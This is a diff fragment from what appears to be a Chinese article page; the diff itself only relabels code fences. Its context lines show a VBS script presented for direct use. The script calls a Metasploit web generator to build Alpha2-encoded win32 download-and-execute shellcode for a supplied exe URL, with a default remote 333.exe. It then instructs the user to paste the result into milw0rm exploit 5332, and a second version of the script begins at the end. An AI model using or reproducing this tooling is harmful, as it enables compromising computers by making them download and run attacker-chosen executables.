@@ -18,7 +18,7 @@ ViewNums: 5659
 代码如下：
 
 '以下代码保存成vbs，双击即可
-```vbs
+```txt
 On Error Resume Next
 Exeurl = InputBox( "请输入exe的地址：", "输入", "http://www.haiyangtop.net/333.exe" )
 url = "http://metasploit.com:55555/PAYLOADS?parent=GLOB%280x2b94a2879c50%29&MODULE=win32_downloadexec&MODE=GENERATE&OPT_URL="&URLEncoding(Exeurl)&"&MaxSize=&BadChars=0x00+&ENCODER=Msf%3A%3AEncoder%3A%3AAlpha2&ACTION=Generate+Payload"
@@ -98,7 +98,7 @@ set fso=Nothing
 wscript.echo Chr(13)&"ok，生成a.txt，请用a.txt里的替换http://www.milw0rm.com/exploits/5332里的shellcode1内容即可"
 ```
 ------------------------------------另外一个版本-----------------------------------
-```vbs
+```txt
 On Error Resume Next
 a=""
 b=""
